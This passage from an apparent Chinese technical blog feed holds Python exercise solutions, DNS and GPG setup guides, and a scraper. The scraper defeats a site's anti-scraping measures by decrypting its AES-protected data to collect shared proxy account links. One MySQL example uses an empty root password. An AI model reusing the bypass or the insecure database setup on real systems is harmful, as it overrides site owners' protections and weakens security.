    <content type="text"><![CDATA[题目敏感词文本文件 filtered_words.txt，里面的内容为以下内容，当用户输入敏感词语时，则打印出 Freedom，否则打印出 Human Rights。 北京程序员公务员领导牛比牛逼你娘你妈lovesexjiangge 分析读取文本内容，添加到列表，获取输入，匹配即可。 代码123456789101112with open('filtered_words.txt','r') as f: #读取内容到一个列表，并过滤每项中的'\n' text = ''.join(f.readlines()).strip('\n').split()while True: #读取输入 line = input("&gt; ") #判断输入内容是否含有敏感词 if any( [words in line for words in text]): print('Freedom') else: print('Human Rights') 扩展当敏感词列表非常多的时候这示例就不是那么好用了，主要原因在于字符匹配算法太低效，可以尝试： AC自动机： https://github.com/gongchangpy/ahocorasick-python DFA算法：https://github.com/iistrate/DFA 参考 https://www.topjishu.com/1826.html]]></content>
      <categories>
        <category>Python练习册</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python练习册：0010]]></title>
    <url>%2F2018%2F06%2F03%2Fpython-exercise-0010%2F</url>
    <content type="text"><![CDATA[题目使用 Python 生成类似于下图中的字母验证码图片。 分析阅读资料内容是如何生成随机字母，还需要使用pillow库建立画布，填充背景颜色和字母，模糊处理，显示结果，这里主要参考廖雪峰Python 教程中的Pillow部分的示例。 pip install pillow 代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849"""使用 Python 生成类似于下图中的字母验证码图片。"""from PIL import Image, ImageDraw, ImageFont, ImageFilterimport randomimport string# 随机字母:def rndChar(): return random.choice(string.ascii_letters)# 随机背景色:def bkgColor(): return (random.randint(64, 255), random.randint(64, 255), random.randint(64, 255))# 随机字母色:def charColor(): return (random.randint(32, 127), random.randint(32, 127), random.randint(32, 127))# 容纳4个字符的宽度 240:width = 60 * 4height = 60image = Image.new('RGB', (width, height), (255, 255, 255))# 创建Font对象:font = ImageFont.truetype('consolab.ttf', 42)# 创建Draw对象:draw = ImageDraw.Draw(image)# 填充每个像素:for x in range(width): for y in range(height): draw.point((x, y), fill=bkgColor())# 输出文字:letters = []for t in range(4): char = rndChar() letters.append(char) #随机偏移位置 draw.text((60 * t + random.randint(10,20), random.randint(10,20)),char, font=font, fill=charColor())# 模糊:image = image.filter(ImageFilter.BLUR)image.save('code.png')#显示print(letters)image.show() 参考 https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/ https://stackoverflow.com/questions/2823316/generate-a-random-letter-in-python]]></content>
      <categories>
        <category>Python练习册</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python练习册：0009]]></title>
    <url>%2F2018%2F06%2F02%2Fpython-exercise-0009%2F</url>
    <content type="text"><![CDATA[题目一个HTML文件，找出里面的链接。 分析先用urlib获取html内容，接着用BeautifulSoup库去解析HTML的a标签,官方文档中就有这个获取链接的示例。 pip install beautifulsoup4 lxml 代码 使用BeautifulSoup库 123456789101112131415161718192021222324252627"""一个HTML文件，找出里面的链接。"""from urllib import requestfrom bs4 import BeautifulSoup as BSurl = "https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001432688314740a0aed473a39f47b09c8c7274c9ab6aee000"req = request.Request(url)req.add_header('User-Agent','Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0')#读取网页内容以utf-8解码html = request.urlopen(req).read().decode('utf-8')soup = BS(html,'lxml')#查找所有&lt;a&gt;a = soup.find_all('a')for link in a: #找href属性的内容 href = link.get('href') try: #排除一些#或./之类的干扰链接 if href.startswith('http'): print(href) except: pass 使用正则表达式有一些链接是不在a标签里的，可以简单粗暴的匹配所有href里的内容。 1234567891011121314from urllib import requestimport reurl = "https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001432688314740a0aed473a39f47b09c8c7274c9ab6aee000"req = request.Request(url)req.add_header('User-Agent','Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0')#读取网页内容以utf-8解码html = request.urlopen(req).read().decode('utf-8')href = re.findall(r'href="(http.*?)"',html)for link in href: print(link) 参考 https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/ https://stackoverflow.com/questions/6883049/regex-to-find-urls-in-string-in-python]]></content>
      <categories>
        <category>Python练习册</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python练习册：0008]]></title>
    <url>%2F2018%2F06%2F01%2Fpython-exercise-0008%2F</url>
    <content type="text"><![CDATA[题目一个HTML文件，找出里面的正文。 分析我们可以用BeautifulSoup库去解析HTML，的结构获取内容,手册提供的实例中就有这个内容，只需要使用get_text()函数即可获取里面的文字内容。 pip install beautifulsoup4 lxml 代码12345678910"""一个HTML文件，找出里面的正文。"""from bs4 import BeautifulSoup as BS#构造一个BeautifulSoup对象soup = BS(open('show-me-the-code.html'),'lxml')#获取正文print(soup.get_text()) 扩展实际上这只是简单的获取标签内容，真正使用的时候，遇到复杂的网页,效果就不是很好了。这时需要一些算法来优化结果。 基于行块分布函数的cx-extractor：https://github.com/chrislinan/cx-extractor-python 使用NLTK的Gooe：(https://github.com/grangier/python-goose 参考 https://www.cnblogs.com/jasondan/p/3497757.html https://piaosanlang.gitbooks.io/spiders/10day/section10.1.html]]></content>
      <categories>
        <category>Python练习册</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python练习册：0007]]></title>
    <url>%2F2018%2F05%2F31%2Fpython-exercise-0007%2F</url>
    <content type="text"><![CDATA[题目有个目录，里面是你自己写过的程序，统计一下你写过多少行代码。包括空行和注释，但是要分别列出来。 分析首先遍历文件夹内容，之前已经做过好多了，接着对空行(’\n’),注释(‘#’，‘’’多行注释’’’ / “””多行注释”””),代码(剩下的内容)分别计数即可。这里用到字符串的一些内置函数。值得注意的是如何统计多行注释，这里我用的是设置一个开关，遇到第一个注释符作为开始，第二个注释符作为结束，中间的内容全算注释。 代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152"""有个目录，里面是你自己写过的程序，统计一下你写过多少行代码。包括空行和注释，但是要分别列出来。"""import osdef count_lines(code_dir): code_lines = 0 blank_lines = 0 comment_lines = 0 comment = False for file in os.listdir(code_dir): filename = os.path.join(code_dir,file) with open(filename,"r") as f: text = f.readlines() for line in text: #排除左边空格的干扰 line = line.lstrip(' ') #单行注释 if(line.startswith('#')): comment_lines += 1 #这里设置一个comment 作为开关 elif(line.startswith("'''") or line.startswith('"""')): comment_lines += 1 comment = not comment #“”“内的换行也算作注释”“” elif(line.startswith('\n')): if comment: comment_lines += 1 else: blank_lines += 1 #非注释内的内容算作代码 else: if comment: comment_lines += 1 else: code_lines +=1 total = code_lines + blank_lines + comment_lines print("共有代码:&#123;&#125;行".format(total)) print("代码:&#123;&#125;行".format(code_lines)) print("注释:&#123;&#125;行".format(comment_lines)) print("空行:&#123;&#125;行".format(blank_lines))if __name__ == '__main__': code_dir = 'code' count_lines(code_dir) 参考 https://github.com/Show-Me-the-Code/python]]></content>
      <categories>
        <category>Python练习册</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python练习册：0006]]></title>
    <url>%2F2018%2F05%2F30%2Fpython-exercise-0006%2F</url>
    <content type="text"><![CDATA[题目你有一个目录，放了你一个月的日记，都是 txt，为了避免分词的问题，假设内容都是英文，请统计出你认为每篇日记最重要的词。 分析 这里可以复用0004的代码统计每篇中最重要的词，这里需要注意排除常见高频词(the,are,of，to…)，这里只做一个简单的实现，若想真正进行词频分析需要使用NLTK模块。 代码123456789101112131415161718192021222324252627282930313233343536"""你有一个目录，放了你一个月的日记，都是 txt，为了避免分词的问题，假设内容都是英文，请统计出你认为每篇日记最重要的词。"""import refrom collections import Counterimport osdef most_common(filename): #读取文件，并全部转化为小写排除干扰 with open(filename,"r") as f: text = f.read().lower() #将标点等干扰全部替换成空格 text = re.sub(r'[,.!?:"]',' ',text) text = re.sub(r'-','',text) #统计词频 counts = Counter(text.split()) #过滤常见高频词 ignore_words=['a','at','an','and','as','by','be','of','said','for','i','it','after',"it's",'in','on','is','she','us','to','not','has','the','that','this','with','have'] for word in ignore_words: if word in counts: counts[word] = 0 #输出最重要的1个词 print("&#123;&#125; the most word is &#123;&#125;".format(filename,counts.most_common(1)[0][0]) )if __name__ == '__main__': dirary_dir = 'dirary' #遍历dirary目录的文件 for file in os.listdir(dirary_dir): filename = os.path.join(dirary_dir,file) most_common(filename) 参考 https://github.com/Show-Me-the-Code/python]]></content>
      <categories>
        <category>Python练习册</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python练习册：0005]]></title>
    <url>%2F2018%2F05%2F29%2Fpython-exercise-0005%2F</url>
    <content type="text"><![CDATA[题目你有一个目录，装了很多照片，把它们的尺寸变成都不大于 iPhone5 分辨率的大小。 分析这里需要用OS模块中的一些函数对文件和目录进行操作，然后使用PIL库对图片进行调整，注意路径问题。 代码123456789101112131415161718192021222324252627282930import osfrom PIL import Imagedef resize(img_dir,MAX_RESIZE,out_dir): try: for file in os.listdir(img_dir): #读取文件 img_file = os.path.join(img_dir,file) img = Image.open(img_file) #调整大小 out = img.resize(MAX_RESIZE) #如果out文件夹不存在则新建一个 if not os.path.exists(out_dir): os.mkdir(out_dir) #保存结果 out_img = os.path.join(out_dir,file) out.save(out_img) except Exception as e: print("操作失败！",e)if __name__ == '__main__': img_dir = 'img' out_dir = 'out' MAX_RESIZE = (640,1130) resize(img_dir,MAX_RESIZE,out_dir) 参考 http://baimoz.me/1399/]]></content>
      <categories>
        <category>Python练习册</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python练习册：0004]]></title>
    <url>%2F2018%2F05%2F28%2Fpython-exercise-0004%2F</url>
    <content type="text"><![CDATA[======================== 题目任一个英文的纯文本文件，统计其中的单词出现的个数。 分析这里可以先从文件中读取内容，然后考虑到大小写问题（Text和text作为一个单词）,缩写问题(I’m 作为一个一个单词),连字符（末尾没写完新开一行te-xt）,标点符号（.,?:”）等问题后，把单词分割好，最后进行个数统计。这里主要使用正则表达式 代码 用 Dict 统计词频 123456789101112131415161718192021222324import rewith open("text.txt","r") as f: #读取文本内容并全部转换为小写字母 text = f.read().lower()#将标点符号替换成空格text = re.sub(r'[,.!?:"]',' ',text)#去掉连字符text = re.sub(r'-','',text)#将计次放入以单词为key的value中counts = &#123;&#125;for word in text.split(): if word not in counts: counts[word] = 1 counts[word] += 1#按词频从大到小排序result = sorted(counts.items(),key=lambda item:item[1],reverse=True)#输出统计结果for i in result: print(i) 用collections库中的Counter计数 1234567891011import refrom collections import Counterwith open("test.txt","r") as f: text = f.read().lower()text = re.sub(r'[,.!?:"]',' ',text)text = re.sub(r'-','',text)#统计词频counts = Counter(text.split())#按顺序输出结果print(counts.most_common()) 参考 https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001431953239820157155d21c494e5786fce303f3018c86000 http://www.runoob.com/python/python-strings.html]]></content>
      <categories>
        <category>Python练习册</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python练习册：0003]]></title>
    <url>%2F2018%2F05%2F27%2Fpython-exercise-0003%2F</url>
    <content type="text"><![CDATA[======================== 题目将 0001 题生成的 200 个激活码（或者优惠券）保存到 Redis 关系型数据库中。 分析对Redis的介绍可以看菜鸟教程，这里使用redis-py库。 pip install redis 准备 Arch Linux 安装Redis12sudo pacman -S redis #安装sudo systemctl start redis #启动Redis数据库 或者使用 redis-server 代码123456789101112131415161718192021222324252627282930313233343536373839# 生成激活码的函数import uuiddef Generate_Code(counts,length=20): key_list = [] for i in range(counts): key = str(uuid.uuid4())[:length] if key not in key_list: key_list.append(key) return key_listimport redis#创建数据库连接def redis_conn(): #用线程池的方式减少性能开销 pool = redis.ConnectionPool(host='localhost', port=6379, db=0) r = redis.Redis(connection_pool=pool) return r#将激活码用List方式储存到Redis数据库def updata_redis(): r = redis_conn() key = Generate_Code(200) for i in key: r.rpush("Code",i) r.save()#从Redis读取数据def getdata(): r = redis_conn() for key in r.lrange("Code",0,-1): print(key)if __name__ == "__main__": updata_redis() getdata() 参考 https://www.jianshu.com/p/2639549bedc8]]></content>
      <categories>
        <category>Python练习册</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python练习册：0002]]></title>
    <url>%2F2018%2F05%2F26%2Fpython-exercise-0002%2F</url>
    <content type="text"><![CDATA[======================== 题目将 0001 题生成的 200 个激活码（或者优惠券）保存到 MySQL 关系型数据库中。 分析这里考察的是对数据库的基本操作，这里使用PyMySQL库。 pip install pymysql 准备 目前Linux 的Mysql软件为MariaDB，它是MySQL的一个分支，主要由开源社区在维护，采用GPL授权许可。以Arch Linux下安装MariaDB数据库为例：1234sudo pacman -S mariadb #安装sudo mysql_install_db --user=mysql --basedir=/usr --datadir=/var/lib/mysql #初始化mysql库sudo systemctl start mariadb #启动MariaDB数据库mysql -u root mysql #用root用户登录到mysql数据库，默认密码为空。 关于Mysql的常用操作可参见 代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455# 生成激活码的函数import uuiddef Generate_Code(counts,length=20): key_list = [] for i in range(counts): key = str(uuid.uuid4())[:length] if key not in key_list: key_list.append(key) return key_listimport pymysqlif __name__ == "__main__": key = Generate_Code(200,20) #创建数据库连接 conn = pymysql.connect( host = "127.0.0.1", user = "root", password = "", database = "test", charset = 'utf8', cursorclass=pymysql.cursors.DictCursor) try: #创建一个游标对象 cursor with conn.cursor() as cursor: #执行 SQL，如果code表存在则删除 cursor.execute("DROP TABLE IF EXISTS code") #创建code数据表 sql = """CREATE TABLE code( id INT UNSIGNED AUTO_INCREMENT, code VARCHAR(32) NOT NULL, PRIMARY KEY(id) )ENGINE=InnoDB DEFAULT CHARSET=utf8; """ cursor.execute(sql) #批量插入数据 cursor.executemany("INSERT INTO code(code) VALUES(%s);",key) #提交更改 conn.commit() with conn.cursor() as cursor: #查询结果 cursor.execute("SELECT * FROM code;") print( cursor.fetchall() ) finally: conn.close() 扩展日常写个小玩具可以用更轻量级的SQLite3，它是一个小巧的储存在本地的数据库。1234567891011121314151617181920212223242526272829303132333435363738394041424344import uuiddef Generate_Code(counts,length=20): key_list = [] for i in range(counts): key = str(uuid.uuid4())[:length] if key not in key_list: #sqlite3 需要的[('afsd'),('feaf'),('fasd')]形式的数据 key_list.append( (key,)) return key_listkey = Generate_Code(200,20)import sqlite3#连接到数据库，并创建游标conn = sqlite3.connect("test.db")c = conn.cursor()#如果KEY表已经存在则先删除#c.execute("DROP TABLE IF EXISTS KEY;")#创建KEY表sql = """CREATE TABLE KEY( ID INTEGER PRIMARY KEY autoincrement, CODE TEXT NOT NULL);"""c.execute(sql)#批量插入数据c.executemany("INSERT INTO KEY VALUES(NULL,?);",key)#更新数据库conn.commit()#查询KEY表内容c.execute("SELECT * FROM KEY;")print( c.fetchall() )#关闭c.close()conn.close() 参考 https://wiki.archlinux.org/index.php/MySQL_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)#.E9.87.8D.E7.BD.AE_root_.E5.AF.86.E7.A0.81 https://www.jianshu.com/p/4490957e29ad https://github.com/PyMySQL/PyMySQL http://www.runoob.com/sqlite/sqlite-python.html]]></content>
      <categories>
        <category>Python练习册</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python练习册：0001]]></title>
    <url>%2F2018%2F05%2F25%2Fpython-exercise-0001%2F</url>
    <content type="text"><![CDATA[======================== 题目做为 Apple Store App 独立开发者，你要搞限时促销，为你的应用生成激活码（或者优惠券），使用 Python 如何生成 200 个激活码（或者优惠券）？ 分析激活码，一般是随机生成的一串字符，需要确保唯一性。 代码 使用secrets库 1234567891011121314151617import secretsdef Generate_Key(counts,length=20): key_list = [] for i in range(counts): key = str(secrets.token_hex(length))[:length] if key not in key_list: #五个字符一组，添加－作为连字符 for j in range(5,length,6): key = key[:j] + '-' + key[j:] key_list.append(key) return key_listprint(Generate_Key(200,20)) 使用uuid库 1234567891011121314import uuiddef Generate_Code(counts,length=20): key_list = [] for i in range(counts): key = str(uuid.uuid4())[:length] if key not in key_list: key_list.append(key) return key_listprint(Generate_Code(200,20)) 参考 https://gist.github.com/geoffalday/202151 https://www.cnblogs.com/hellojesson/p/6410445.html]]></content>
      <categories>
        <category>Python练习册</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python练习册：0000]]></title>
    <url>%2F2018%2F05%2F24%2Fpython-exercise-0000%2F</url>
    <content type="text"><![CDATA[======================== 题目将你的 QQ 头像（或者微博头像）右上角加上红色的数字，类似于微信未读信息数量那种提示效果。 类似于图中效果 分析这里需要给图片添加文字信息，这里使用图像处理的相关库——PIL pip install pillow 代码12345678910111213141516171819202122from PIL import Image,ImageDraw,ImageFont #导入所需库def add_num(img,num_text,num_size): #获取一个Image可以直接操作的对象 img = Image.open(img) draw = ImageDraw.Draw(img) #设置字体文件，大小，颜色 font = ImageFont.truetype("consolab.ttf",size=num_size) fillcolor = "#ff0000" width,height = img.size #绘制 draw.text( (width - 40,10),num_text,font=font,fill=fillcolor) #保存结果 img.save("num.png","png")if __name__ == "__main__": img = "1.png" add_num(img,"99",30) 扩展 Windows/Linux 字体文件不一样，如何让其具有通用性？ 如何让代码有更高的复用性（图片类型，指定字体属性）？ 参考 https://github.com/jobbole/awesome-python-cn https://stackoverflow.com/questions/16373425/add-text-on-image-using-pil]]></content>
      <categories>
        <category>Python练习册</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Pcap_DNS搭建本地防污染DNS服务器]]></title>
    <url>%2F2018%2F04%2F14%2FPcap-DNSProxy-md%2F</url>
    <content type="text"><![CDATA[======================== DNS介绍 我们使用的互联网是基于TCP/IP协议的，而TCP/IP的基石是IP地址，所以在网络上进行通讯时只能识别如“202.96.134.133”之类的IP地址，但对于人类来说，记住很多IP地址是件很困难的事情，于是发明了DNS（Domain Name System，域名系统），现在我们访问网站时，只需要输入相应的域名，就能看到所需要的页面。这是因为互联网上有一种叫“DNS服务器”的计算机会自动把我们的域名“翻译”成了相应的IP地址，并告诉我们。以访问百度为例www.baidu.com，系统会向DNS服务器（如8.8.8.8）发送请求：”嘿，我要用度娘，赶紧告诉我它的IP地址”，DNS服务器收到请求后，就会回复我们：”这是百度的ip地址，请查收“，系统收到IP地址后，便会和百度的服务器进行通信，最后得到我们看到的网页。 DNS的问题一般运营商（联通，电信，移动）都会搭建自己的DNS服务器，以提高响应速度，但是运营商会为了为了某些目的，会对DNS做一些手脚，导致我们无法通过域名解析出正确的IP地址。常用的手段有：DNS劫持和DNS污染。网上很多文章建议将DNS设为公共DNS（如阿里的223.5.5.5,谷歌的8.8.8.8,腾讯的119.29.29.29），但是你们也太小看运营商了，以移动为例：他们会对UDP53（DNS默认向53端口用UDP包发送查询请求）进行抢答。随便输入一个IP地址（8.1.2.3不是任何公共DNS服务器地址），都能给你返回查询结果。 解决方案这里介绍使用Pcap_DNSProxy搭建防污染防劫持的DNS服务器。Win/MacOS都有编译好的二进制文件，可以直接下载使用。 下文介绍Arch Linux下的Pcap_DNSProxy的编译与使用，其他环境请参考chengr28的官方文档 安装编译环境 sudo pacman -S gcc cmake libpcap libsodium openssl git bind-tools 下载源码 git clone https://github.com/chengr28/Pcap_DNSProxy.git 编译生成可执行文件 cd Pcap_DNSProxy/Source/Auxiliary/Scripts #进入指定目录chmod 755 CMake_Build.sh #赋予脚本执行权限./CMake_Build.sh #执行编译程序 编译成功后，Pcap_DNSProxy/Source/Release 目录下的文件即目标程序和配置文件，我们先来测试一下。 123cd ../../Release #切换到Relese目录sudo ./Pcap_DNSProxy --disable-daemon #调试运行dig @127.0.0.1 github.com #若能正常返回查询结果，即正常工作 设置开机自启 进入Release目录并编辑 Pcap_DNSProxy.service 文件，编辑完成后保存： WorkingDirectory= 项为程序所在目录的绝对路径(例如:/home/my/Pcap_DNSProxy/Source/Release)ExecStart= 项为程序所在目录的绝对路径，并在最后加上程序的名称(例如：/home/my/Pcap_DNSProxy/Source/Release/Pcap_DNSProxy) 自动安装到系统，并设为开机自启 sudo ./Linux_Install.Systemd.sh 修改系统DNS设置 12&gt; echo "nameserver 127.0.0.1\nnameserver 8.8.8.8" | sudo tee /etc/resolv.conf #修改系统DNS为127.0.0.1&gt;sudo chattr +i /etc/resolv.conf #其他网络管理程序可能会修改这个文件,设置特殊权限以避免被其他程序改动 再来测试一下,类似的结果即配置成功 其他 正常情况，Pcap_DNSProxy 可以做到开箱即用，你想做一些调整的话，可以修改配置文件Config.conf1234Outgoing Protocol = IPv4 + UDP + TCP #优先使用UDP，提高解析速度EDNS Label = 1 #EDNS 标签支持SOCKS Proxy = 1 #允许使用Sock5代理，以远程解析DNS请求SOCKS IPv4 Address = 127.0.0.1:1080 更详细配置请阅读文档 参考 https://zh.wikipedia.org/wiki/%E5%9F%9F%E5%90%8D%E7%B3%BB%E7%BB%9F https://www.v2ex.com/t/442340#reply15 https://www.v2ex.com/t/360775 https://wiki.archlinux.org/index.php/Resolv.conf]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python爬取某站科学上网帐号(5.15更新)]]></title>
    <url>%2F2018%2F04%2F07%2Fpython-getss%2F</url>
    <content type="text"><![CDATA[前言无意间发现了一个SS帐号分享站，但每次都需要手动获取帐号信息太麻烦了，这里用Python写一个爬虫来自动获取帐号信息。 分析先来看一下网站源码。站长做了防爬处理，数据并不保存在源代码中，并且针对爬虫常见的模拟浏览器手段进行检测。 看一下网络连接，发现了一个ss.json的get请求，内容居然帐号信息。本以为是站长特意留下的API接口，测试之后才发现里面的帐号信息都不能正常使用。现在只能老老实实的去分析源码了。网站关键部分是用javascript写的。123456789101112//用a，b 分别初始化x（key）,y(iv)var a = '1a52316b1ed72c8f';var b = 'cd3e6a7914085b2f';var c = '327bd961633a77c4';var x = CryptoJS.enc.Latin1.parse(a);var y = CryptoJS.enc.Latin1.parse(b);//post方法提交a,b,c,得到密文data$.post("data.php",&#123;a:a,b:b,c:c&#125;,function(data)&#123; //解密 var dec = CryptoJS.AES.decrypt(data,x,&#123;iv:y,mode:CryptoJS.mode.ECB,padding:CryptoJS.pad.Pkcs7&#125;); //格式化成json格式方便后面使用 var tbdt = $.parseJSON(dec.toString(CryptoJS.enc.Utf8))&#125; 可以看到流程如下 判断是否是正常的浏览器，如果正常，就用POST方法提交正确的a,b,c 参数，服务端会返回一串AES密文 用a，b分别初始化key，iv，用Crypto－js库去解密返回的数据 解密后，重新排版，优化显示 这里我们用Python去模拟整个过程 123456789101112131415161718192021222324252627import reimport base64import requestsfrom Crypto.Cipher import AESheaders = &#123;'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:59.0) Gecko/20100101 Firefox/59.0'&#125;url= "https://free-ss.site/"url2="https://free-ss.site/data.php" #获取正确的a,b,c参数s = requests.session()html = s.get(url,headers=headers,timeout=3)a,b,c = re.findall(r"\'(.*?)\'",html.text)[6:9]#post提交a,b,c,得到密文p_data = &#123;'a':a,'b':b,'c':c&#125;msg = s.post(url2,headers=headers,data=p_data,timeout=3)endata = base64.b64decode(msg.text) #返回的是base64编码数据，先解码#用正确的参数初始化AES，ECB模式不需要iv向量key = bytes(a,encoding="utf-8")#iv = bytes(b,encoding="utf-8")aes = AES.new(key,AES.MODE_ECB)#解密得到数据data ＝ aes.decrypt(endata).decode('utf-8') 我们可以看到数据末尾多了一些无用字符，因为AES加密需要原始数据块是16位的倍数，不足则用按照某些标准(诸如源码中的Pkcs7)进行填充补位。我们继续处理解密后的数据，生成ss链接以方便直接导入12345678910import jsonss_data = re.findall(r'&#123;.*&#125;',data)[0] #去掉多余的填充字符ss_json = json.loads(ss_data)['data'] #json化数据for i in ss_json: #ss://method:password@server:port ss = "&#123;&#125;:&#123;&#125;@&#123;&#125;:&#123;&#125;".format(i[3],i[4],i[1],i[2]) ss_url = "ss://"+ bytes.decode( base64.b64encode(bytes(ss,encoding="utf8")) ) #print(ss) print(ss_url) 后来发现网站每次使用的加密方法都是随机的，Crypto-js一共实现了AES的5种加密模式:CBC、CFB、CTR、ECB、OFB,每种都用Python实现太麻烦了，这里我们取个巧：判断加密模式，如果是ECB，则进行解密，否则重新请求网页信息。整个Demo如下： 1234567891011121314151617181920212223242526272829303132import reimport base64import jsonimport requestsfrom Crypto.Cipher import AESif __name__ == '__main__': headers = &#123;'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:59.0) Gecko/20100101 Firefox/59.0'&#125; url= "https://free-ss.site/" url2="https://free-ss.site/data.php" while(1): s = requests.session() html = s.get(url,headers=headers,timeout=3) mode = re.findall(r"CryptoJS.mode.(\w&#123;3&#125;)",html.text) print(mode) if 'ECB' in mode: a,b,c = re.findall(r"\'(.*?)\'",html.text)[6:9] p_data = &#123;'a':a,'b':b,'c':c&#125; msg = s.post(url2,headers=headers,data=p_data,timeout=3) endata = base64.b64decode(msg.text) key = bytes(a,encoding="utf-8") aes = AES.new(key,AES.MODE_ECB) data = aes.decrypt(endata).decode('utf-8') ss_data = re.findall(r'&#123;.*&#125;',data)[0] ss_json = json.loads(ss_data)['data'] for i in ss_json: #ss://method:password@server:port ss = "&#123;&#125;:&#123;&#125;@&#123;&#125;:&#123;&#125;".format(i[3],i[4],i[1],i[2]) ss_url = "ss://"+ bytes.decode( base64.b64encode(bytes(ss,encoding="utf8")) ) #print(ss) print(ss_url) break 后续完整脚本已经放在Github上,一键版下载地址 本文仅供学习交流，如有冒犯之处，联系可删。 参考 https://blog.zhengxianjun.com/2015/05/javascript-crypto-js https://gist.github.com/marcoslin/8026990 https://bbs.pediy.com/thread-224363.htm]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[保护你的邮件通信——Mailvelope（GPG）]]></title>
    <url>%2F2018%2F03%2F29%2Fgpg%2F</url>
    <content type="text"><![CDATA[前言谈到隐私保护的时候人们最常说的话就是“我没什么可藏，我光明磊落，政府监控就监控吧，我不在乎”，或者“不做亏心事，不怕鬼敲门”,更极端的想法是“反正他们知道一切，我做啥都没用。” 爱德华·斯诺登表示：“我不在乎隐私权，因为我没什么好藏的”这样的观点，和“我不在乎言论自由，因为我没什么好说的”意思接近。当一个人说“我没什么好藏的”，实际上是在说“我不在乎自己的权利”，也就是“我不拥有权利，因为我无法为我的权利辩解”，而对权利的正确解读应该是“政府侵犯你的权利，政府才应该辩解”。[1] 虽然在大数据时代我们很难做到完全匿名，但我们依然可以通过加密手段在一定程度上保护自己的隐私。 加密可以保护我们的数据。无论数据是正存放在我们自己的计算机上，还是位于数据中心，或者正在通过互联网传送的途中，加密都可以提供防护。加密可以保护我们的聊天，不管是视频、语音还是文字。加密可以保护我们的隐私，可以隐藏我们的踪迹，甚至有时候，它会保护我们的性命。 这种保护是攸关我们每个人的。不需要太多解释就可以明白，加密对于活动于威权国家中的记者与人权或政治活动家的重要性。但加密同样也会保护不属于这些群体的其他人。加密抵御犯罪分子的入侵，抵御竞争对手的窃密，防止家庭成员或者邻居偷窥。加密防御的不只是有意的攻击者，还包括没有预料到的意外情况。[2] 下面介绍用Mailvelope在网页端上加密自己的电子邮件。 正文介绍Mailvelope是一种浏览器扩展，遵守OpenPGP标准[3]可以对电子邮件和文件进行加密，解密，签名和认证。它不需要您下载或安装其他邮件客户端，就可以为WebMail用户提供端到端加密的最简单方法。下载地址：Chrome版Firefox版 使用 安装完成后，点击Mailvelope的插件图标，点设置图标进入设置页面。 这里我们生成一个新的密钥,如果你已经有GPG密钥,可以直接导入。 导出你的公钥，文本框中的内容即为你的公钥，任何可以获得你公钥的人都可以给你发加密邮件 导入别人的公钥，有对方的公钥才能给它发送加密邮件。 进入你的网页邮箱，如果你的邮件服务商在mailvelope默认支持列表中，在写信框中会出现一个小图标。如果没有发现，请添加网站支持后，刷新页面生效。 点击小图标，会弹出对话框（这里貌似有一个bug，在弹出窗口右键单击才会显示内容）开始写内容。 撰写完成后点加密。发现已经变成了密文，即可发送给对方。(如果开启了签名，还需要输入你创建密钥时设置的密码才可以加密内容) 收到加密邮件，点一下，在弹出窗口输入你的私钥密码即可成功解密。 注意 Mailvelope 不会加密你的邮箱地址和对方的邮箱地址以及主题名，请不要使用真实姓名注册邮箱，如果可以尽量单独申请一个隐私性较好的邮箱服务商（比如ProtonMail）。 请妥善保存你的私钥，做好备份，以防丢失后无法解密数据 第一次给对方发送加密电子邮件时，可以放心的将你的公钥一并附上，以方便对方给你回复加密邮件。[4] 扩展阅读 GPG原理：https://xeodou.me/2015/09/13/how-pgp-works/ 隐私工具介绍：https://cybermagicsec.github.io/privacytools-zh/ 安全工具箱指南：https://securityinabox.org/zh/ 编程随想的隐私保护技巧：https://program-think.blogspot.com/2013/06/privacy-protection-0.html 参考[1] 维基百科：无所隐瞒论 https://zh.wikipedia.org/zh-sg/%E6%97%A0%E6%89%80%E9%9A%90%E7%9E%92%E8%AE%BA[2] 为什么要加密：https://www.neoatlantis.org/%E7%94%B5%E5%B7%A5%E7%94%B5%E5%AD%90%E5%8F%8A%E4%BF%A1%E6%81%AF%E6%8A%80%E6%9C%AF/2016/11/18/why-encrypt.html[3] OpenPGP标准：https://tools.ietf.org/html/rfc4880[4] 